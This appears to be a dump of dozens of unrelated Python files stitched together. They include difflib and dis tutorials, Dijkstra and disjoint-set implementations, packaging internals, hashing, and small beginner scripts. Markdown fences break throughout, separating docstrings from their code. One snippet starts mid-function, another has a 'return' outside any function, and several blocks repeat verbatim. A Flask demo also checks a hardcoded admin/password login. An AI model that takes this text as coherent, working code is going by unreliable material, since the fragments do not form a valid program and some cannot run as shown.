    a = find_primitive(q)
    if a is None:
        print(f"Cannot find the primitive for the value: {a!r}")
    else:
        a_private = int(input("Enter private key of A: "))
        a_public = pow(a, a_private, q)
        b_private = int(input("Enter private key of B: "))
        b_public = pow(a, b_private, q)

        a_secret = pow(b_public, a_private, q)
        b_secret = pow(a_public, b_private, q)

        print("The key value generated by A is: ", a_secret)
        print("The key value generated by B is: ", b_secret)

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#```


```pyContext diff example```


```py

# end_pymotw_header
import difflib
from difflib_data import *

diff = difflib.context_diff(text1_lines, text2_lines, lineterm="")
print("\n".join(diff))

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#```


```pyData for use with difflib examples.```


```py


# end_pymotw_header
text1 = """Lorem ipsum dolor sit amet, consectetuer adipiscing
elit. Integer eu lacus accumsan arcu fermentum euismod. Donec
pulvinar porttitor tellus. Aliquam venenatis. Donec facilisis
pharetra tortor.  In nec mauris eget magna consequat
convalis. Nam sed sem vitae odio pellentesque interdum. Sed
consequat viverra nisl. Suspendisse arcu metus, blandit quis,
rhoncus ac, pharetra eget, velit. Mauris urna. Morbi nonummy
molestie orci. Praesent nisi elit, fringilla ac, suscipit non,
tristique vel, mauris. Curabitur vel lorem id nisl porta
adipiscing. Suspendisse eu lectus. In nunc. Duis vulputate
tristique enim. Donec quis lectus a justo imperdiet tempus."""

text1_lines = text1.splitlines()

text2 = """Lorem ipsum dolor sit amet, consectetuer adipiscing
elit. Integer eu lacus accumsan arcu fermentum euismod. Donec
pulvinar, porttitor tellus. Aliquam venenatis. Donec facilisis
pharetra tortor. In nec mauris eget magna consequat
convalis. Nam cras vitae mi vitae odio pellentesque interdum. Sed
consequat viverra nisl. Suspendisse arcu metus, blandit quis,
rhoncus ac, pharetra eget, velit. Mauris urna. Morbi nonummy
molestie orci. Praesent nisi elit, fringilla ac, suscipit non,
tristique vel, mauris. Curabitur vel lorem id nisl porta
adipiscing. Duis vulputate tristique enim. Donec quis lectus a
justo imperdiet tempus.  Suspendisse eu lectus. In nunc."""

text2_lines = text2.splitlines()

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#```


```pyDiffer example```


```py


# end_pymotw_header
import difflib
from difflib_data import *

d = difflib.Differ()
diff = d.compare(text1_lines, text2_lines)
print("\n".join(diff))

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#```


```pyHtmlDiff example```


```py


# end_pymotw_header
import difflib
from difflib_data import *

d = difflib.HtmlDiff()
print(d.make_table(text1_lines, text2_lines))

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#
````

`pyUsing the junk filter feature.`

````py

# end_pymotw_header
# This example is adapted from the source for difflib.py.

from difflib import SequenceMatcher


def show_results(match):
    print("  a    = {}".format(match.a))
    print("  b    = {}".format(match.b))
    print("  size = {}".format(match.size))
    i, j, k = match
    print("  A[a:a+size] = {!r}".format(A[i : i + k]))
    print("  B[b:b+size] = {!r}".format(B[j : j + k]))


A = " abcd"
B = "abcd abcd"

print("A = {!r}".format(A))
print("B = {!r}".format(B))

print("\nWithout junk detection:")
s1 = SequenceMatcher(None, A, B)
match1 = s1.find_longest_match(0, len(A), 0, len(B))
show_results(match1)

print("\nTreat spaces as junk:")
s2 = SequenceMatcher(lambda x: x == " ", A, B)
match2 = s2.find_longest_match(0, len(A), 0, len(B))
show_results(match2)

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#```


```pyndiff example```


```py

# end_pymotw_header
import difflib
from difflib_data import *

diff = difflib.ndiff(text1_lines, text2_lines)
print("\n".join(diff))

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#```


```pySequenceMatcher example```


```py

# end_pymotw_header
import difflib

s1 = [1, 2, 3, 5, 6, 4]
s2 = [2, 3, 5, 4, 6, 1]

print("Initial data:")
print("s1 =", s1)
print("s2 =", s2)
print("s1 == s2:", s1 == s2)
print()

matcher = difflib.SequenceMatcher(None, s1, s2)
for tag, i1, i2, j1, j2 in reversed(matcher.get_opcodes()):

    if tag == "delete":
        print("Remove {} from positions [{}:{}]".format(s1[i1:i2], i1, i2))
        print("  before =", s1)
        del s1[i1:i2]

    elif tag == "equal":
        print("s1[{}:{}] and s2[{}:{}] are the same".format(i1, i2, j1, j2))

    elif tag == "insert":
        print("Insert {} from s2[{}:{}] into s1 at {}".format(s2[j1:j2], j1, j2, i1))
        print("  before =", s1)
        s1[i1:i2] = s2[j1:j2]

    elif tag == "replace":
        print(
            ("Replace {} from s1[{}:{}] " "with {} from s2[{}:{}]").format(
                s1[i1:i2], i1, i2, s2[j1:j2], j1, j2
            )
        )
        print("  before =", s1)
        s1[i1:i2] = s2[j1:j2]

    print("   after =", s1, "\n")

print("s1 == s2:", s1 == s2)

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#```


```pyUnified diff example```


```py


# end_pymotw_header
import difflib
from difflib_data import *

diff = difflib.unified_diff(text1_lines, text2_lines, lineterm="")
print("\n".join(diff))

def digitDegree(n):
    number, degree = str(n), 0

    while len(number) != 1:
        number = str(sum([int(digit) for digit in number]))
        degree += 1
    return degree

#!/usr/bin/env python```


```py
Solution to Project Euler Problem
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

Dealing with digits.```


```py
from memoization import memoize


def seq2str(q):
    return "".join(str(c) for c in q)


def sdigits(n):
    return (c for c in str(n))


def digits(n):
    return (int(c) for c in str(n))


def sorted_digits(n):
    return tuple(sorted(digits(n)))


def last_k_digits(k, n):
    return n % (10 ** k)


@memoize
def digits_upto(k, i=0):
    return seq2str(range(i, min(k + 1, 10)))


def digits_downfrom(k, i=0):
    return seq2str(range(min(k + 1, 10), i, -1))


def sorted_digits_str(n):
    return seq2str(sorted(str(n)))


def is_semi_pandigital(n):
    s = str(n)
    return "0" not in s and len(s) == len(set(s))


def is_pandigital(n):
    d = str(n)
    return sorted(d) == list(digits_upto(len(d), 1))


def digit_rotations(n):
    d = str(n)
    for i in range(len(d)):
        yield int(d[i:] + d[:i])

def digitsProduct(product):
    """
    Given an integer product, find the smallest
    positive (i.e. greater than 0) integer the
    product of whose digits is equal to product.
    If there is no such integer, return -1 instead.

    Time Complexity: O(inf)
    Space Complexity: O(1)
    """
    number = 1
    while True:
        p = 1
        digits = [int(x) for x in str(number)]
        for n in digits:
            p = p * n
        if number > 10000:
            return -1
        if p == product:
            return number
        number += 1

from __future__ import print_function


def printDist(dist, V):
    print("\nVertex Distance")
    for i in range(V):
        if dist[i] != float("inf"):
            print(i, "\t", int(dist[i]), end="\t")
        else:
            print(i, "\t", "INF", end="\t")
        print()


def minDist(mdist, vset, V):
    minVal = float("inf")
    minInd = -1
    for i in range(V):
        if (not vset[i]) and mdist[i] < minVal:
            minInd = i
            minVal = mdist[i]
    return minInd


def Dijkstra(graph, V, src):
    mdist = [float("inf") for i in range(V)]
    vset = [False for i in range(V)]
    mdist[src] = 0.0

    for i in range(V - 1):
        u = minDist(mdist, vset, V)
        vset[u] = True

        for v in range(V):
            if (
                (not vset[v])
                and graph[u][v] != float("inf")
                and mdist[u] + graph[u][v] < mdist[v]
            ):
                mdist[v] = mdist[u] + graph[u][v]

    printDist(mdist, V)


# MAIN
V = int(input("Enter number of vertices: "))
E = int(input("Enter number of edges: "))

graph = [[float("inf") for i in range(V)] for j in range(V)]

for i in range(V):
    graph[i][i] = 0.0

for i in range(E):
    print("\nEdge ", i + 1)
    src = int(input("Enter source:"))
    dst = int(input("Enter destination:"))
    weight = float(input("Enter weight:"))
    graph[src][dst] = weight

gsrc = int(input("\nEnter shortest path source:"))
Dijkstra(graph, V, gsrc)

def printDist(dist, V):
    print("\nVertex Distance")
    for i in range(V):
        if dist[i] != float("inf"):
            print(i, "\t", int(dist[i]), end="\t")
        else:
            print(i, "\t", "INF", end="\t")
        print()


def minDist(mdist, vset, V):
    minVal = float("inf")
    minInd = -1
    for i in range(V):
        if (not vset[i]) and mdist[i] < minVal:
            minInd = i
            minVal = mdist[i]
    return minInd


def Dijkstra(graph, V, src):
    mdist = [float("inf") for i in range(V)]
    vset = [False for i in range(V)]
    mdist[src] = 0.0

    for i in range(V - 1):
        u = minDist(mdist, vset, V)
        vset[u] = True

        for v in range(V):
            if (
                (not vset[v])
                and graph[u][v] != float("inf")
                and mdist[u] + graph[u][v] < mdist[v]
            ):
                mdist[v] = mdist[u] + graph[u][v]

    printDist(mdist, V)


if __name__ == "__main__":
    V = int(input("Enter number of vertices: ").strip())
    E = int(input("Enter number of edges: ").strip())

    graph = [[float("inf") for i in range(V)] for j in range(V)]

    for i in range(V):
        graph[i][i] = 0.0

    for i in range(E):
        print("\nEdge ", i + 1)
        src = int(input("Enter source:").strip())
        dst = int(input("Enter destination:").strip())
        weight = float(input("Enter weight:").strip())
        graph[src][dst] = weight

    gsrc = int(input("\nEnter shortest path source:").strip())
    Dijkstra(graph, V, gsrc)
````

````py
ID: 1288e78d-bc7a-44da-8774-41c0e4dcfe70
Grokking Algorithms, Page 115
Python Algorithms, Page 194
https://en.wikipedia.org/wiki/Dijkstra%27s_algorithm

The explanation in Grokking Algorithms is good, but the code is needlessly complicated.
This is a minimalist Dijkstras. See the other versions for more features and better time complexity.```


```py
from collections.abc import Mapping
from math import inf
from numbers import Rational

from src.typehints import Node


def dijkstras_distances_min(
    graph: Mapping[Node, Mapping[Node, Rational]], start: Node
) -> dict[Node:Rational]:
    """Find the minimum distance from start to all connected nodes on a directed, weighted graph."""
    distances = dict.fromkeys(graph, inf)
    distances[start] = 0
    unvisited = set(graph)
    while unvisited:
        # Using min like this increases the time complexity compared to a priority queue, but it simplifies things.
        node = min(unvisited, key=distances.__getitem__)
        unvisited.remove(node)
        distance = distances[node]
        for next_node, weight in graph[node].items():
            distances[next_node] = min(distances[next_node], distance + weight)
    return distances
````

````py
ID: 1288e78d-bc7a-44da-8774-41c0e4dcfe70
Grokking Algorithms, Page 115
Python Algorithms, Page 194
https://en.wikipedia.org/wiki/Dijkstra%27s_algorithm

The explanation in Grokking Algorithms is good, but the code is needlessly complicated.
This is a minimalist Dijkstras. See the other versions for more features and better time complexity.```


```py
from collections.abc import Mapping
from math import inf
from numbers import Rational

from src.typehints import Node


def dijkstras_distances_min(
    graph: Mapping[Node, Mapping[Node, Rational]], start: Node
) -> dict[Node:Rational]:
    """Find the minimum distance from start to all connected nodes on a directed, weighted graph."""
    distances = dict.fromkeys(graph, inf)
    distances[start] = 0
    unvisited = set(graph)
    while unvisited:
        # Using min like this increases the time complexity compared to a priority queue, but it simplifies things.
        node = min(unvisited, key=distances.__getitem__)
        unvisited.remove(node)
        distance = distances[node]
        for next_node, weight in graph[node].items():
            distances[next_node] = min(distances[next_node], distance + weight)
    return distances
````

````py
ID: b23383a0-792a-47e9-a13c-fe4f2417f909
Python Algorithms, Page 194
https://en.wikipedia.org/wiki/Dijkstra%27s_algorithm#Using_a_priority_queue
Instead of decreasing priority, just always add it and check if it's visited.
The output from this function will work with backpedal.py.```


```py
from collections.abc import Mapping
from heapq import heappop, heappush
from numbers import Real
from typing import Optional

from src.typehints import Node


def dijkstras_path_pq(
    graph: Mapping[Node, Mapping[Node, Real]], start: Node, goal: Node
) -> dict[Node, Optional[Node]]:
    """Find the shortest path from start to goal in a directed, weighted graph. Return it as a parents dict."""
    distances = {start: 0}
    parents = {start: None}
    visited = set()
    to_visit = [(0, start)]
    while to_visit:
        distance, node = heappop(to_visit)
        if node in visited:
            continue
        visited.add(node)
        if node == goal:
            break
        for next_node, weight in graph[node].items():
            next_distance = distance + weight
            if next_node not in distances or next_distance < distances[next_node]:
                distances[next_node] = next_distance
                parents[next_node] = node
                heappush(to_visit, (next_distance, next_node))
    return parents
````

````py
ID: b23383a0-792a-47e9-a13c-fe4f2417f909
Python Algorithms, Page 194
https://en.wikipedia.org/wiki/Dijkstra%27s_algorithm#Using_a_priority_queue
Instead of decreasing priority, just always add it and check if it's visited.
The output from this function will work with backpedal.py.```


```py
from collections.abc import Mapping
from heapq import heappop, heappush
from numbers import Real
from typing import Optional

from src.typehints import Node


def dijkstras_path_pq(
    graph: Mapping[Node, Mapping[Node, Real]], start: Node, goal: Node
) -> dict[Node, Optional[Node]]:
    """Find the shortest path from start to goal in a directed, weighted graph. Return it as a parents dict."""
    distances = {start: 0}
    parents = {start: None}
    visited = set()
    to_visit = [(0, start)]
    while to_visit:
        distance, node = heappop(to_visit)
        if node in visited:
            continue
        visited.add(node)
        if node == goal:
            break
        for next_node, weight in graph[node].items():
            next_distance = distance + weight
            if next_node not in distances or next_distance < distances[next_node]:
                distances[next_node] = next_distance
                parents[next_node] = node
                heappush(to_visit, (next_distance, next_node))
    return parents

import os
import io
import contextlib
import tempfile
import shutil
import errno
import zipfile


@contextlib.contextmanager
def tempdir():
    """Create a temporary directory in a context manager."""
    td = tempfile.mkdtemp()
    try:
        yield td
    finally:
        shutil.rmtree(td)


def mkdir_p(*args, **kwargs):
    """Like `mkdir`, but does not raise an exception if the
    directory already exists.
    """
    try:
        return os.mkdir(*args, **kwargs)
    except OSError as exc:
        if exc.errno != errno.EEXIST:
            raise


def dir_to_zipfile(root):
    """Construct an in-memory zip file for a directory."""
    buffer = io.BytesIO()
    zip_file = zipfile.ZipFile(buffer, "w")
    for root, dirs, files in os.walk(root):
        for path in dirs:
            fs_path = os.path.join(root, path)
            rel_path = os.path.relpath(fs_path, root)
            zip_file.writestr(rel_path + "/", "")
        for path in files:
            fs_path = os.path.join(root, path)
            rel_path = os.path.relpath(fs_path, root)
            zip_file.write(fs_path, rel_path)
    return zip_file

#!/usr/bin/env python3
# encoding: utf-8

import dis


class MyObject:
    """Example for dis."""

    CLASS_ATTRIBUTE = "some value"

    def __str__(self):
        return "MyObject({})".format(self.name)

    def __init__(self, name):
        self.name = name


dis.dis(MyObject)

#!/usr/bin/env python3
# encoding: utf-8

# Folded
i = 1 + 2
f = 3.4 * 5.6
s = "Hello," + " World!"

# Not folded
I = i * 3 * 4
F = f / 2 / 3
S = s + "\n" + "Fantastic!"

#!/usr/bin/env python3
# encoding: utf-8

import operator
import itertools


class Dictionary:
    def __init__(self, words):
        self.by_letter = {}
        self.load_data(words)

    def load_data(self, words):
        # Arrange by letter
        grouped = itertools.groupby(words, key=operator.itemgetter(0))
        # Save arranged sets of words
        self.by_letter = {group[0][0]: group for group in grouped}

#!/usr/bin/env python3
# encoding: utf-8

import string


class Dictionary:
    def __init__(self, words):
        self.by_letter = {letter: [] for letter in string.ascii_letters}
        self.load_data(words)

    def load_data(self, words):
        for word in words:
            self.by_letter[word[0]].append(word)

#!/usr/bin/env python3
# encoding: utf-8

import collections


class Dictionary:
    def __init__(self, words):
        self.by_letter = collections.defaultdict(list)
        self.load_data(words)

    def load_data(self, words):
        by_letter = self.by_letter
        for word in words:
            by_letter[word[0]].append(word)

#!/usr/bin/env python3
# encoding: utf-8


def f(*args):
    nargs = len(args)
    print(nargs, args)


if __name__ == "__main__":
    import dis

    dis.dis(f)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import dis
import textwrap
import timeit


def add(words):
    result = ""
    for word in words:
        result = result + word
    return result


def add_inline(words):
    result = ""
    for word in words:
        result += word
    return result


def join(words):
    return "".join(words)


if __name__ == "__main__":
    for fname in ["add", "add_inline", "join"]:
        print("FUNCTION:", fname, "\n")
        f = globals()[fname]
        dis.dis(f)
        t = timeit.Timer(
            "d = {fname}(words)".format(fname=fname),
            textwrap.dedent(
                """
            from dis_loops import {fname}
            words = [
                l.strip()
                for l in open('/usr/share/dict/words', 'rt')
            ]
            """
            ).format(fname=fname),
        )
        iterations = 3
        print("TIME: {:0.4f}\n".format(t.timeit(iterations)))

#!/usr/bin/env python3
# encoding: utf-8


def f(*args):
    nargs = len(args)
    print(nargs, args)


if __name__ == "__main__":
    import dis

    dis.show_code(f)

#!/usr/bin/env python3
# encoding: utf-8


class Dictionary:
    def __init__(self, words):
        self.by_letter = {}
        self.load_data(words)

    def load_data(self, words):
        for word in words:
            try:
                self.by_letter[word[0]].append(word)
            except KeyError:
                self.by_letter[word[0]] = [word]

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#

# end_pymotw_header
import dis

code = """
my_dict = {'a': 1}```


```py

print("Disassembly:\n")
dis.dis(code)

print("\nCode details:\n")
dis.show_code(code)

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```









---


```py


# end_pymotw_header
import dis
import sys
import textwrap
import timeit

module_name = sys.argv[1]
module = __import__(module_name)
Dictionary = module.Dictionary

dis.dis(Dictionary.load_data)
print()
t = timeit.Timer(
    "d = Dictionary(words)",
    textwrap.dedent(
        """
    from {module_name} import Dictionary
    words = [
        l.strip()
        for l in open('/usr/share/dict/words', 'rt')
    ]
    """
    ).format(module_name=module_name),
)
iterations = 10
print("TIME: {:0.4f}".format(t.timeit(iterations) / iterations))

#!/usr/bin/env python3
# encoding: utf-8

i = 1
j = 0
k = 3

try:
    result = k * (i / j) + (i / k)
except Exception:
    import dis
    import sys

    exc_type, exc_value, exc_tb = sys.exc_info()
    dis.distb(exc_tb)

def percToDiscount(percent, mp):
    discount = percent / 100 * mp
    return "Discount is : " + str(discount)


print("Hello\n")
print("Press Enter to exit")
while (
    True
):  # I've put counting discount in a loop cause if you want to count on multiple items
    more = str(input("Count or End : "))
    if more == "Count":
        disCountPerc = float(input("Discount Percent : "))
        marketPrice = float(input("Market Price : "))
        print(percToDiscount(disCountPerc, marketPrice))
        continue
    else:
        quit()

def iLoveDiscount(discount, mp):  # mp is market price
    discountPerc = discount / mp * 100
    return "Discount is " + str(discountPerc) + "%"


print("Hello\n")
print("Press Enter to exit")
while (
    True
):  # I've put counting discount in a loop cause if you want to count on multiple items
    more = str(input("Count or End : "))
    if more == "Count":
        disCount = float(input("Discount : "))
        marketPrice = float(input("Market Price : "))
        print(iLoveDiscount(disCount, marketPrice))
        continue
    else:
        quit()

from __future__ import absolute_import, unicode_literals

from abc import ABCMeta, abstractmethod

from six import add_metaclass


@add_metaclass(ABCMeta)
class Discover(object):
    """Discover and provide the requested Python interpreter"""

    @classmethod
    def add_parser_arguments(cls, parser):
        """Add CLI arguments for this discovery mechanisms.

        :param parser: the CLI parser
        """
        raise NotImplementedError

    # noinspection PyUnusedLocal
    def __init__(self, options):
        """Create a new discovery mechanism.

        :param options: the parsed options as defined within :meth:`add_parser_arguments`
        """
        self._has_run = False
        self._interpreter = None
        self._env = options.env

    @abstractmethod
    def run(self):
        """Discovers an interpreter.


        :return: the interpreter ready to use for virtual environment creation
        """
        raise NotImplementedError

    @property
    def interpreter(self):
        """
        :return: the interpreter as returned by :meth:`run`, cached
        """
        if self._has_run is False:
            self._interpreter = self.run()
            self._has_run = True
        return self._interpreter

from __future__ import absolute_import, unicode_literals

from .base import PluginLoader


class Discovery(PluginLoader):
    """ """


def get_discover(parser, args):
    discover_types = Discovery.entry_points_for("virtualenv.discovery")
    discovery_parser = parser.add_argument_group(
        title="discovery", description="discover and provide a target interpreter"
    )
    choices = _get_default_discovery(discover_types)
    # prefer the builtin if present, otherwise fallback to first defined type
    choices = sorted(choices, key=lambda a: 0 if a == "builtin" else 1)
    discovery_parser.add_argument(
        "--discovery",
        choices=choices,
        default=next(iter(choices)),
        required=False,
        help="interpreter discovery method",
    )
    options, _ = parser.parse_known_args(args)
    discover_class = discover_types[options.discovery]
    discover_class.add_parser_arguments(discovery_parser)
    options, _ = parser.parse_known_args(args, namespace=options)
    discover = discover_class(options)
    return discover


def _get_default_discovery(discover_types):
    return list(discover_types.keys())
````

````py
    disjoint set
    Reference: https://en.wikipedia.org/wiki/Disjoint-set_data_structure```


```py


class Node:
    def __init__(self, data):
        self.data = data


def make_set(x):
    """
    make x as a set.
    """
    # rank is the distance from x to its' parent
    # root's rank is 0
    x.rank = 0
    x.parent = x


def union_set(x, y):
    """
    union two sets.
    set with bigger rank should be parent, so that the
    disjoint set tree will be more flat.
    """
    x, y = find_set(x), find_set(y)
    if x.rank > y.rank:
        y.parent = x
    else:
        x.parent = y
        if x.rank == y.rank:
            y.rank += 1


def find_set(x):
    """
    return the parent of x
    """
    if x != x.parent:
        x.parent = find_set(x.parent)
    return x.parent


def find_python_set(node: Node) -> set:
    """
    Return a Python Standard Library set that contains i.
    """
    sets = ({0, 1, 2}, {3, 4, 5})
    for s in sets:
        if node.data in s:
            return s
    raise ValueError(f"{node.data} is not in {sets}")


def test_disjoint_set():
    """
    >>> test_disjoint_set()
    """
    vertex = [Node(i) for i in range(6)]
    for v in vertex:
        make_set(v)

    union_set(vertex[0], vertex[1])
    union_set(vertex[1], vertex[2])
    union_set(vertex[3], vertex[4])
    union_set(vertex[3], vertex[5])

    for node0 in vertex:
        for node1 in vertex:
            if find_python_set(node0).isdisjoint(find_python_set(node1)):
                assert find_set(node0) != find_set(node1)
            else:
                assert find_set(node0) == find_set(node1)


if __name__ == "__main__":
    test_disjoint_set()

# To print the disk usage of the current directory
# Author Sandip Dutta

# -------------------------------------------
import shutil
import os
# -------------------------------------------
# GLOBALS
bytes_to_giga_bytes = 1024 * 1024 * 1024
blue_bg = u"\u001b[44;1m"  # Blue
green_bg = u"\u001b[42;1m"  # Green
red_bg = u"\u001b[41;1m"  # red
reset = u"\u001b[0m"  # make output non sticky
MAX_LENGTH = int(os.get_terminal_size().columns * 0.25)
# ---------------------------------------------

# Get disk usage analysis
total_space, used_space, free_space = shutil.disk_usage(os.getcwd())


def get_length(space, total_space=total_space):
    # Gives value of length of data
    percent = (space / total_space) * MAX_LENGTH
    return int(percent)


# Transform to appropriate length
total_space_len, used_space_len, free_space_len = get_length(total_space), get_length(used_space),\
    get_length(free_space)


def get_value_bar(space_value, space_len, bgcolor, space_name, reset=reset):
    # Generates printable bar for display
    # Space value - value of space to display
    # bgcolor - selects background colour
    # space_name - The name of the space, total space, used space
    # or free space
    # reset - resets the coloured output
    space_val_gb = round(space_value / bytes_to_giga_bytes, 2)

    left_len = " " * (space_len)

    output_string = f"{space_name}\t{space_val_gb} GB\t{bgcolor} {left_len} {reset}"
    return output_string


print('-' * MAX_LENGTH)
print(f"Space analysis Report")
print('-' * MAX_LENGTH)
print(f'Utility called from {os.getcwd()}')
print(get_value_bar(total_space, total_space_len, blue_bg, "Total Space"))
print(get_value_bar(used_space, used_space_len, red_bg, "Used Space"))
print(get_value_bar(free_space, free_space_len, green_bg, "Free Space"))
````

````py
Create a dist_info directory
As defined in the wheel specification```


```py

import os

from distutils.core import Command
from distutils import log


class dist_info(Command):

    description = "create a .dist-info directory"

    user_options = [
        (
            "egg-base=",
            "e",
            "directory containing .egg-info directories"
            " (default: top of the source tree)",
        )
    ]

    def initialize_options(self):
        self.egg_base = None

    def finalize_options(self):
        pass

    def run(self):
        egg_info = self.get_finalized_command("egg_info")
        egg_info.egg_base = self.egg_base
        egg_info.finalize_options()
        egg_info.run()
        dist_info_dir = egg_info.egg_info[: -len(".egg-info")] + ".dist-info"
        log.info("creating '{}'".format(os.path.abspath(dist_info_dir)))

        bdist_wheel = self.get_finalized_command("bdist_wheel")
        bdist_wheel.egg2dist(egg_info.egg_info, dist_info_dir)

# this is a simple geometric distance formula
# d(x,y) = |x-y| = distance
# where x and y are co-ordinates on a number line


def distance(x, y):
    return abs(x - y)


flag = True
while flag:
    usr = str(input("start [Y/n]: ")).strip().lower()
    if usr == "y":
        print(
            distance(
                float(input("Value of X co-ordinate: ")),
                float(input("Value of Y co-ordinate: ")),
            ),
            "\n",
        )
    else:
        flag = False

from distutils.errors import DistutilsArgError
from distutils.fancy_getopt import FancyGetopt
from typing import Dict, List

_options = [
    ("exec-prefix=", None, ""),
    ("home=", None, ""),
    ("install-base=", None, ""),
    ("install-data=", None, ""),
    ("install-headers=", None, ""),
    ("install-lib=", None, ""),
    ("install-platlib=", None, ""),
    ("install-purelib=", None, ""),
    ("install-scripts=", None, ""),
    ("prefix=", None, ""),
    ("root=", None, ""),
    ("user", None, ""),
]


# typeshed doesn't permit Tuple[str, None, str], see python/typeshed#3469.
_distutils_getopt = FancyGetopt(_options)  # type: ignore


def parse_distutils_args(args: List[str]) -> Dict[str, str]:
    """Parse provided arguments, returning an object that has the
    matched arguments.

    Any unknown arguments are ignored.
    """
    result = {}
    for arg in args:
        try:
            _, match = _distutils_getopt.getopt(args=[arg])
        except DistutilsArgError:
            # We don't care about any other options, which here may be
            # considered unrecognized since our option list is not
            # exhaustive.
            pass
        else:
            result.update(match.__dict__)
    return result

n, d = eval(dir()[0])
while n % d < 1:
    n /= d
return n

# def divideAsLongAsPossible(n, d):
#     while n % d == 0:
#         n /= d
#     return n
````

```py
Aim: Calculate the sum of all the divisors of the entered number and display it.
```

```py

# function to find out all divisors and add them up
def divisorSum(n):
    temp = []
    for i in range(1, n + 1):
        # condition for finding factors
        if n % i == 0:
            temp.append(i)
    # adding all divisors
    return sum(temp)


# getting the input
n = int(input())
# printing the result
print(divisorSum(n))
```

```py
COMPLEXITY:

  Time Complexity -> O(N)
  Space Complexity -> O(1)

Sample Input:
6
Sample Output:
12

Explaination:
Divisors/Factors of 6 are --> 1,2,3 and 6.
Adding them up --> 1+2+3+6 = 12.
```

```py

```

````py
This algorithm (k=33) was first reported by Dan Bernstein many years ago in comp.lang.c
Another version of this algorithm (now favored by Bernstein) uses xor:
    hash(i) = hash(i - 1) * 33 ^ str[i];

    First Magic constant 33:
    It has never been adequately explained.
    It's magic because it works better than many other constants, prime or not.

    Second Magic Constant 5381:

    1. odd number
    2. prime number
    3. deficient number
    4. 001/010/100/000/101 b

    source: http://www.cse.yorku.ca/~oz/hash.html```


```py


def djb2(s: str) -> int:
    """
    Implementation of djb2 hash algorithm that
    is popular because of it's magic constants.

    >>> djb2('Algorithms')
    3782405311

    >>> djb2('scramble bits')
    1609059040
    """
    hash = 5381
    for x in s:
        hash = ((hash << 5) + hash) + ord(x)
    return hash & 0xFFFFFFFF

from doubly_linked_list import DoublyLinkedList


class Queue:
    def __init__(self):
        # counter to keep track of the number of elements in our queue
        self.size = 0
        # we'll use our LinkedList implementation to build the queue
        self.storage = DoublyLinkedList()

    def enqueue(self, item):
        pass

    def dequeue(self):
        pass

    def len(self):
        pass

from doubly_linked_list import DoublyLinkedList


class Stack:
    def __init__(self):
        self.size = 0
        self.storage = DoublyLinkedList()

    def push(self, value):
        pass

    def pop(self):
        pass

    def len(self):
        pass

#!/usr/bin/env python3
# -*- coding: utf-8 -*-


def foo(s):
    n = int(s)
    assert n != 0, "n is zero!"
    return 10 / n


def main():
    foo("0")


main()

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64

s = base64.b64encode("PythonBASE 64".encode("utf-8"))
print(s)
d = base64.b64decode(s).decode("utf-8")
print(d)

s = base64.urlsafe_b64encode("PythonBASE 64".encode("utf-8"))
print(s)
d = base64.urlsafe_b64decode(s).decode("utf-8")
print(d)

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from io import BytesIO

# write to BytesIO:
f = BytesIO()
f.write(b"hello")
f.write(b" ")
f.write(b"world!")
print(f.getvalue())

# read from BytesIO:
data = "，。，。".encode("utf-8")
f = BytesIO(data)
print(f.read())

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from contextlib import contextmanager


@contextmanager
def closing(fname):
    f = None
    try:
        f = open(fname, "r")
        yield f
    finally:
        if f:
            f.close()


with closing("test.txt") as f:
    print(f.read())

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from datetime import datetime
import os

pwd = os.path.abspath(".")

print("      Size     Last Modified  Name")
print("------------------------------------------------------------")

for f in os.listdir(pwd):
    fsize = os.path.getsize(f)
    mtime = datetime.fromtimestamp(os.path.getmtime(f)).strftime("%Y-%m-%d %H:%M")
    flag = "/" if os.path.isdir(f) else ""
    print("%10d  %s  %s%s" % (fsize, mtime, f, flag))

#!/usr/bin/env python3
# -*- coding: utf-8 -*-


def is_odd(n):
    return n % 2 == 1


L = range(100)

print(list(filter(is_odd, L)))


def not_empty(s):
    return s and s.strip()


print(list(filter(not_empty, ["A", "", "B", None, "C", "  "])))

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from flask import Flask
from flask import request

app = Flask(__name__)


@app.route("/", methods=["GET", "POST"])
def home():
    return "<h1>Home</h1>"


@app.route("/signin", methods=["GET"])
def signin_form():
    return """<form action="/signin" method="post">
              <p><input name="username"></p>
              <p><input name="password" type="password"></p>
              <p><button type="submit">Sign In</button></p>
              </form>"""


@app.route("/signin", methods=["POST"])
def signin():
    # request：
    if request.form["username"] == "admin" and request.form["password"] == "password":
        return "<h3>Hello, admin!</h3>"
    return "<h3>Bad username or password.</h3>"


if __name__ == "__main__":
    app.run()

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os

print("Process (%s) start..." % os.getpid())
# Only works on Unix/Linux/Mac:
pid = os.fork()
if pid == 0:
    print("I am child process (%s) and my parent is %s." % (os.getpid(), os.getppid()))
else:
    print("I (%s) just created a child process (%s)." % (os.getpid(), pid))

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# list:
names = ["Michael", "Bob", "Tracy"]
for name in names:
    print(name)

#  0 - 9
for x in range(10):
    print(x)

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

s = (x * x for x in range(5))
print(s)
for x in s:
    print(x)


def fib(max):
    n, a, b = 0, 0, 1
    while n < max:
        yield b
        a, b = b, a + b
        n = n + 1
    return "done"


f = fib(10)
print("fib(10):", f)
for x in f:
    print(x)

# call generator manually:
g = fib(5)
while 1:
    try:
        x = next(g)
        print("g:", x)
    except StopIteration as e:
        print("Generator return value:", e.value)
        break

#!/usr/bin/env python3
